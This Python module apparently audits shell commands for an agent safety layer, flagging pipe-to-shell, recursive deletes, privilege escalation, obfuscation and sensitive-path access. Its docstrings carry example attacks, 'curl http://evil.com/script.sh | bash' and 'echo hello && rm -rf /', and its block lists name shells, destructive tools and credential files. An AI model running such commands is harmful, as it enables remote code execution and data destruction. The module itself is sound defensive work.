"""
AETHER AST Command Audit — Deep Shell Command Security Analysis

Parses shell commands into pseudo-AST structures to detect dangerous
operations that regex patterns might miss.

This catches:
- Chained commands hiding dangerous ops (echo foo && rm -rf /)
- Variable expansion attacks ($HOME→/ type attacks)
- Pipe-to-shell patterns (curl | bash)
- Nested subshell execution
- Obfuscated commands (base64 decode | sh)
- Heredoc abuse
- Path traversal (../../etc/passwd)

Works alongside SafetyChecker (regex) for defense in depth.
"""

import re
import shlex
import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional, Dict, Set, Tuple

logger = logging.getLogger("aether.ast_audit")


# ---------------------------------------------------------------------------
# Types
# ---------------------------------------------------------------------------

class AuditSeverity(str, Enum):
    INFO = "info"
    WARNING = "warning"
    DANGER = "danger"
    CRITICAL = "critical"


@dataclass
class AuditFinding:
    """A single security finding from command analysis."""
    rule_id: str
    severity: AuditSeverity
    title: str
    detail: str
    command_fragment: str = ""


@dataclass
class CommandAuditResult:
    """Full audit result for a command string."""
    command: str
    findings: List[AuditFinding] = field(default_factory=list)
    is_safe: bool = True
    risk_score: int = 0  # 0-100
    parsed_segments: List[str] = field(default_factory=list)

    def add(self, finding: AuditFinding) -> None:
        self.findings.append(finding)
        # Escalate severity
        severity_scores = {
            AuditSeverity.INFO: 5,
            AuditSeverity.WARNING: 20,
            AuditSeverity.DANGER: 50,
            AuditSeverity.CRITICAL: 100,
        }
        self.risk_score = min(100, self.risk_score + severity_scores[finding.severity])
        if finding.severity in (AuditSeverity.DANGER, AuditSeverity.CRITICAL):
            self.is_safe = False

    @property
    def highest_severity(self) -> Optional[AuditSeverity]:
        if not self.findings:
            return None
        order = [AuditSeverity.INFO, AuditSeverity.WARNING,
                 AuditSeverity.DANGER, AuditSeverity.CRITICAL]
        return max(
            (f.severity for f in self.findings),
            key=lambda s: order.index(s),
        )


# ---------------------------------------------------------------------------
# Dangerous patterns (deeper than SafetyChecker's regex)
# ---------------------------------------------------------------------------

# Commands that should never be piped *to*
DANGEROUS_PIPE_TARGETS: Set[str] = {
    "sh", "bash", "zsh", "fish", "dash",
    "python", "python3", "perl", "ruby", "node",
    "eval", "exec", "source",
    "powershell", "pwsh", "cmd",
}

# Commands that are inherently destructive
DESTRUCTIVE_COMMANDS: Set[str] = {
    "rm", "rmdir", "del", "rd",
    "mkfs", "dd", "shred", "wipe",
    "format", "fdisk", "parted",
    "shutdown", "reboot", "halt", "poweroff", "init",
    "kill", "killall", "pkill", "taskkill",
    "iptables", "ufw", "firewall-cmd",
}

# Commands that escalate privileges
ESCALATION_COMMANDS: Set[str] = {
    "sudo", "su", "doas", "runas",
    "chmod", "chown", "chattr",
    "setfacl", "icacls", "cacls",
    "visudo", "passwd",
}

# Obfuscation tools
OBFUSCATION_TOOLS: Set[str] = {
    "base64", "xxd", "od",
    "openssl", "gpg",
    "certutil",  # Windows base64 decode
}

# Sensitive paths
SENSITIVE_PATHS: List[str] = [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers",
    "/root/", "~/.ssh/",
    "C:\\Windows\\System32",
    "C:\\Windows\\SAM",
    "/dev/sda", "/dev/nvme",
]


# ---------------------------------------------------------------------------
# AST Command Audit Engine
# ---------------------------------------------------------------------------

class ASTCommandAudit:
    """
    Deep command analysis using pseudo-AST parsing.

    Provides defense-in-depth alongside regex-based SafetyChecker.

    Usage:
        audit = ASTCommandAudit()
        result = audit.analyze("curl http://evil.com/script.sh | bash")
        if not result.is_safe:
            for finding in result.findings:
                print(f"[{finding.severity}] {finding.title}")
    """

    def analyze(self, command: str) -> CommandAuditResult:
        """
        Analyze a shell command string for security risks.

        Performs:
        1. Command segmentation (split on pipes, chains, etc.)
        2. Per-segment analysis
        3. Cross-segment analysis (pipe chains, etc.)
        4. Variable/expansion detection
        5. Path traversal detection
        """
        result = CommandAuditResult(command=command)

        if not command or not command.strip():
            return result

        # 1. Split into segments
        segments = self._split_command(command)
        result.parsed_segments = segments

        # 2. Per-segment checks
        for seg in segments:
            self._check_destructive(seg, result)
            self._check_escalation(seg, result)
            self._check_obfuscation(seg, result)
            self._check_sensitive_paths(seg, result)
            self._check_recursive_force(seg, result)

        # 3. Cross-segment: pipe-to-shell
        self._check_pipe_to_shell(command, segments, result)

        # 4. Variable expansion
        self._check_variable_expansion(command, result)

        # 5. Subshell execution
        self._check_subshell(command, result)

        # 6. Redirect to sensitive targets
        self._check_redirect_danger(command, result)

        # 7. Command chaining hiding danger
        self._check_chain_hiding(segments, result)

        return result

    # ------------------------------------------------------------------
    # Command splitting
    # ------------------------------------------------------------------

    def _split_command(self, command: str) -> List[str]:
        """
        Split a command string into logical segments.

        Handles:
        - Pipes: |
        - Command chains: &&, ||, ;
        - Subshells: $(), ``
        """
        # Split on pipes, &&, ||, ;
        segments = re.split(r'\s*(?:\|{1,2}|&&|;)\s*', command)
        return [s.strip() for s in segments if s.strip()]

    def _get_base_command(self, segment: str) -> str:
        """Extract the base command name from a segment."""
        try:
            parts = shlex.split(segment)
            if parts:
                # Handle env, sudo, etc. prefixes
                cmd = parts[0]
                if cmd in ("sudo", "su", "doas", "env", "nohup", "nice"):
                    return parts[1] if len(parts) > 1 else cmd
                return cmd.split("/")[-1]  # Strip path
        except ValueError:
            # shlex can fail on malformed strings
            parts = segment.split()
            if parts:
                return parts[0].split("/")[-1]
        return ""

    # ------------------------------------------------------------------
    # Individual checks
    # ------------------------------------------------------------------

    def _check_destructive(self, segment: str, result: CommandAuditResult) -> None:
        """Check for destructive commands."""
        cmd = self._get_base_command(segment)
        if cmd.lower() in DESTRUCTIVE_COMMANDS:
            result.add(AuditFinding(
                rule_id="AST-DESTRUCTIVE",
                severity=AuditSeverity.DANGER,
                title=f"Destructive command: {cmd}",
                detail=f"'{cmd}' can irreversibly destroy data or processes.",
                command_fragment=segment,
            ))

    def _check_escalation(self, segment: str, result: CommandAuditResult) -> None:
        """Check for privilege escalation."""
        cmd = self._get_base_command(segment)
        if cmd.lower() in ESCALATION_COMMANDS:
            result.add(AuditFinding(
                rule_id="AST-ESCALATION",
                severity=AuditSeverity.WARNING,
                title=f"Privilege escalation: {cmd}",
                detail=f"'{cmd}' modifies system permissions or identity.",
                command_fragment=segment,
            ))

    def _check_obfuscation(self, segment: str, result: CommandAuditResult) -> None:
        """Check for command obfuscation techniques."""
        cmd = self._get_base_command(segment)
        if cmd.lower() in OBFUSCATION_TOOLS:
            # Only concerning if piped somewhere
            result.add(AuditFinding(
                rule_id="AST-OBFUSCATION",
                severity=AuditSeverity.WARNING,
                title=f"Potential obfuscation: {cmd}",
                detail=f"'{cmd}' can be used to decode/obfuscate commands.",
                command_fragment=segment,
            ))

    def _check_sensitive_paths(self, segment: str, result: CommandAuditResult) -> None:
        """Check for access to sensitive filesystem paths."""
        for path in SENSITIVE_PATHS:
            if path.lower() in segment.lower():
                result.add(AuditFinding(
                    rule_id="AST-SENSITIVE-PATH",
                    severity=AuditSeverity.DANGER,
                    title=f"Sensitive path access: {path}",
                    detail=f"Command touches sensitive system path '{path}'.",
                    command_fragment=segment,
                ))

    def _check_recursive_force(self, segment: str, result: CommandAuditResult) -> None:
        """Check for recursive + force flags on destructive commands."""
        cmd = self._get_base_command(segment)
        if cmd.lower() in ("rm", "del", "rd", "rmdir"):
            flags = re.findall(r'-\w+', segment)
            flag_str = " ".join(flags)
            if ("r" in flag_str and "f" in flag_str) or "/s" in segment.lower():
                result.add(AuditFinding(
                    rule_id="AST-RECURSIVE-FORCE",
                    severity=AuditSeverity.CRITICAL,
                    title="Recursive force delete detected",
                    detail="Recursive + force flags on delete command. "
                           "This can destroy entire directory trees without confirmation.",
                    command_fragment=segment,
                ))

    def _check_pipe_to_shell(
        self, full_cmd: str, segments: List[str], result: CommandAuditResult,
    ) -> None:
        """Check for pipe-to-shell patterns (curl | bash)."""
        pipe_parts = full_cmd.split("|")
        for i in range(len(pipe_parts) - 1):
            target = pipe_parts[i + 1].strip()
            target_cmd = self._get_base_command(target)
            if target_cmd.lower() in DANGEROUS_PIPE_TARGETS:
                source_cmd = self._get_base_command(pipe_parts[i].strip())
                result.add(AuditFinding(
                    rule_id="AST-PIPE-TO-SHELL",
                    severity=AuditSeverity.CRITICAL,
                    title=f"Pipe-to-shell: {source_cmd} | {target_cmd}",
                    detail="Piping output directly to a shell interpreter. "
                           "This enables arbitrary remote code execution.",
                    command_fragment=f"{pipe_parts[i].strip()} | {target}",
                ))

    def _check_variable_expansion(
        self, command: str, result: CommandAuditResult,
    ) -> None:
        """Check for potentially dangerous variable expansion."""
        # $(...) command substitution
        if re.search(r'\$\(', command):
            result.add(AuditFinding(
                rule_id="AST-CMD-SUBSTITUTION",
                severity=AuditSeverity.WARNING,
                title="Command substitution detected",
                detail="$() syntax embeds sub-command execution. "
                       "Verify the substituted command is safe.",
                command_fragment=command,
            ))

        # Backtick command substitution
        if "`" in command:
            result.add(AuditFinding(
                rule_id="AST-BACKTICK-EXEC",
                severity=AuditSeverity.WARNING,
                title="Backtick command substitution",
                detail="Backticks execute embedded commands. "
                       "Verify the substituted command is safe.",
                command_fragment=command,
            ))

    def _check_subshell(self, command: str, result: CommandAuditResult) -> None:
        """Check for subshell invocations."""
        # Bash-style: (commands)  or  { commands; }
        if re.search(r'(?:^|\s)\(.*\)', command):
            result.add(AuditFinding(
                rule_id="AST-SUBSHELL",
                severity=AuditSeverity.INFO,
                title="Subshell invocation",
                detail="Command uses subshell grouping. "
                       "Subshells can isolate environment changes.",
                command_fragment=command,
            ))

    def _check_redirect_danger(
        self, command: str, result: CommandAuditResult,
    ) -> None:
        """Check for redirects to sensitive targets."""
        # Output redirect to /dev/sda, /etc/*, etc.
        redirect_match = re.search(r'>\s*(/\S+)', command)
        if redirect_match:
            target = redirect_match.group(1)
            for path in SENSITIVE_PATHS:
                if path.lower() in target.lower():
                    result.add(AuditFinding(
                        rule_id="AST-REDIRECT-DANGER",
                        severity=AuditSeverity.CRITICAL,
                        title=f"Redirect to sensitive target: {target}",
                        detail=f"Output is redirected to sensitive path '{target}'. "
                               "This could overwrite critical system files.",
                        command_fragment=command,
                    ))

            # Redirect to block devices
            if re.match(r'/dev/(sd|hd|nvme|vd)', target):
                result.add(AuditFinding(
                    rule_id="AST-REDIRECT-DEVICE",
                    severity=AuditSeverity.CRITICAL,
                    title=f"Redirect to block device: {target}",
                    detail="Writing directly to a block device can destroy "
                           "the entire filesystem.",
                    command_fragment=command,
                ))

    def _check_chain_hiding(
        self, segments: List[str], result: CommandAuditResult,
    ) -> None:
        """
        Check if destructive commands are hidden behind innocent-looking chains.

        e.g., "echo hello && rm -rf /" — the echo is innocent,
        but the rm is devastating.
        """
        if len(segments) < 2:
            return

        # Check if any non-first segment is destructive
        for seg in segments[1:]:
            cmd = self._get_base_command(seg)
            if cmd.lower() in DESTRUCTIVE_COMMANDS:
                result.add(AuditFinding(
                    rule_id="AST-CHAIN-HIDING",
                    severity=AuditSeverity.DANGER,
                    title="Destructive command hidden in chain",
                    detail=f"'{cmd}' appears after an innocent command. "
                           "This could be an attempt to hide dangerous operations.",
                    command_fragment=seg,
                ))
